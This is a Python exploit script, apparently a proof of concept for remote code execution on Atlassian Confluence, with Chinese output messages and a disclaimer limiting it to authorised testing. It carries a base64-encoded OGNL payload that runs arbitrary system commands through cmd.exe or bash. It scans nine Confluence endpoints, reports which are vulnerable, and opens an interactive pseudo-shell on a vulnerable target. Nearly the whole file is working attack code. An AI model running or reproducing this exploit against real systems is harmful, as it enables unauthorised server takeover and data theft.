import requests
import base64
import sys
import re
import getopt
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def unescape(html):
    return html.replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace('&#39;', "'").strip("\n")

payload = """cXVlcnlTdHJpbmc9YWFhYWFhYWFcdTAwMjclMmJ7Q2xhc3MuZm9yTmFtZShcdTAwMjdqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlclx1MDAyNykubmV3SW5zdGFuY2UoKS5nZXRFbmdpbmVCeU5hbWUoXHUwMDI3SmF2YVNjcmlwdFx1MDAyNykuXHUwMDY1dmFsKFx1MDAyN3Zhcitpc1dpbislM2QramF2YS5sYW5nLlN5c3RlbS5nZXRQcm9wZXJ0eShcdTAwMjJvcy5uYW1lXHUwMDIyKS50b0xvd2VyQ2FzZSgpLmNvbnRhaW5zKFx1MDAyMndpblx1MDAyMiklM2IrdmFyK2NtZCslM2QrbmV3K2phdmEubGFuZy5TdHJpbmcoXHUwMDIyaWZjb25maWdcdTAwMjIpJTNidmFyK3ArJTNkK25ldytqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoKSUzYitpZihpc1dpbil7cC5jb21tYW5kKFx1MDAyMmNtZC5leGVcdTAwMjIsK1x1MDAyMi9jXHUwMDIyLCtjbWQpJTNiK30rZWxzZXtwLmNvbW1hbmQoXHUwMDIyYmFzaFx1MDAyMiwrXHUwMDIyLWNcdTAwMjIsK2NtZCklM2IrfXAucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKSUzYit2YXIrcHJvY2VzcyUzZCtwLnN0YXJ0KCklM2IrdmFyK2lucHV0U3RyZWFtUmVhZGVyKyUzZCtuZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlcihwcm9jZXNzLmdldElucHV0U3RyZWFtKCkpJTNiK3ZhcitidWZmZXJlZFJlYWRlcislM2QrbmV3K2phdmEuaW8uQnVmZmVyZWRSZWFkZXIoaW5wdXRTdHJlYW1SZWFkZXIpJTNiK3ZhcitsaW5lKyUzZCtcdTAwMjJcdTAwMjIlM2IrdmFyK291dHB1dCslM2QrXHUwMDIyXHUwMDIyJTNiK3doaWxlKChsaW5lKyUzZCtidWZmZXJlZFJlYWRlci5yZWFkTGluZSgpKSshJTNkK251bGwpe291dHB1dCslM2Qrb3V0cHV0KyUyYitsaW5lKyUyYitqYXZhLmxhbmcuQ2hhcmFjdGVyLnRvU3RyaW5nKDEwKSUzYit9XHUwMDI3KX0lMmJcdTAwMjdhYWFhYWFhYQ=="""

def check(url,cmd):
    p = "cXVlcnlTdHJpbmc9YWFhYVx1MDAyNyUyYiN7MyozMzN9JTJiXHUwMDI3YmJi"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    try:
        r = requests.post(url, headers=headers, data=base64.b64decode(p), verify=False, timeout=30)
        if r.status_code == 200 and "aaa{999=null}bbb" in r.text:
            cmd_responses = command(url,cmd)
            if len(cmd_responses) == 0:
                print("[+] %s 存在漏洞，命令执行未回显" % url)
            else:
                print("[+] %s 存在漏洞，命令执行结果为：%s" % (url,cmd_responses[0].strip("\n")))
            return True
        else:
            return False
    except BaseException as e:
        print("[-] %s 漏洞不存在" % url)
        sys.exit(0)

def command(url,cmd):
    p = "cXVlcnlTdHJpbmc9YWFhYVx1MDAyNyUyYiN7MyozMzN9JTJiXHUwMDI3YmJi"
    h = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    r = requests.post(url, headers=h, data=base64.b64decode(payload).decode("utf-8").replace("ifconfig", cmd.encode().decode()), verify=False,timeout=15)
    if r.status_code==200:
        try:
            pattern = re.compile(r'aaaaaaaa\[(.*?)\]aaaaaaaa',re.S)
            re_result = re.findall(pattern, r.text)
            return re_result
        except BaseException as e:
            print("[-] %s 漏洞利用失败，无法执行命令" % url)
    else:
        print("[-] %s 漏洞利用失败，无法执行命令" % url)

def shell(url,cmd):
    h = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
    }
    r = requests.post(url, headers=h, data=base64.b64decode(payload).decode("utf-8").replace("ifconfig", cmd.encode().decode()), verify=False,timeout=15)
    if r.status_code == 200:
        try:
            output = r.text.split("aaaaaaaa[")[1].split(']aaaaaaaa')[0]
            print(unescape(output))
        except BaseException as e:
            pass
    else:
        pass

def usage():
    print("")
    print("confluence_rce / confluence远程代码执行单站点RCE")
    print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
    print("橘子网络安全实验室 @https://0range.team/")
    print("")
    print("*************************警 告*****************************")
    print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
    print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
    print("***********************************************************")
    print("")
    print("使用方法：python confluence_rce.py -u url -c cmd或python confluence_rce.py --url url --command cmd")
    print("")

def main():
    usage()
    bash_shell = False
    if not len(sys.argv[1:]):
        sys.exit(0)
    try:
        opts,args = getopt.getopt(sys.argv[1:],"c:u:",["command","url","shell"])
    except getopt.GetoptError as err:
        print(str(err))
        sys.exit(0)
    for o,a in opts:
        if o in ("-u","--url"):
            url = a
        elif o in ("-c", "--command"):
            cmd = a
        elif o in ("--shell"):
            bash_shell = True

    print("[*] 漏洞探测...")

    endpoint_list = [
        "/pages/createpage-entervariables.action?SpaceKey=x",
        "/pages/doenterpagevariables.action",
        "/pages/createpage.action?spaceKey=myproj",
        "/users/user-dark-features",
        "/login",
        "/pages/templates2/viewpagetemplate.action",
        "/template/custom/content-editor",
        "/templates/editor-preload-container",
        "/pages/createpage-entervariables.action"
    ]
    subnum = 0
    for l in endpoint_list:
        endpoint = url + l
        flag = check(endpoint,cmd)
        if not flag:
            subnum += 1
            if subnum == 9:
                print("[-] %s 漏洞不存在" % url)
                sys.exit(0)

    if bash_shell:
        url = input("[+] 请输入已探测到的漏洞地址:")
        while True:
            cmd = input("Jun_sheng:~# ")
            if cmd in ("e","exit"):
                sys.exit(0)
            shell(url,cmd)
    else:
        sys.exit(0)

main()
